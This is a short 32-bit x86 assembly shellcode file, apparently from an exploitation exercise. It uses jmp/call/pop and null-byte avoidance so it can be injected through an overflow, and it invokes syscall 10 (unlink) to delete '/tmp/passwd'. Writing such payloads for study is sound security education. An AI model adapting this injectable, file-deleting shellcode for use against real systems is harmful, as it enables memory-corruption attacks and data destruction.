#include <sys/syscall.h>

#define STRING	"/tmp/passwd"
#define STRLEN	11
#define ARGV	(STRLEN+1)
#define ENVP	(ARGV+4)

.globl main
	.type	main, @function

 main:
	jmp	calladdr

 popladdr:
	popl	%esi
	movl	%esi,(ARGV)(%esi)	/* set up argv pointer to pathname */
	xorl	%eax,%eax		/* get a 32-bit zero value */
	movb	%al,(STRLEN)(%esi)	/* null-terminate our string */
	movl	%eax,(ENVP)(%esi)	/* set up null envp */

	movb	$0x09,%al		/* syscall arg 1: syscall number */
	inc     %al
	movl	%esi,%ebx		/* syscall arg 2: string pathname */
    	leal 	ARGV(%esi),%ecx
	leal 	ENVP(%esi),%edx
	int	$0x80			/* invoke syscall */

	xorl	%ebx,%ebx		/* syscall arg 2: 0 */
	movl	%ebx,%eax
	inc	%eax			/* syscall arg 1: SYS_exit (1), uses */
					/* mov+inc to avoid null byte */
	int	$0x80			/* invoke syscall */

 calladdr:
	call	popladdr
	.ascii	STRING
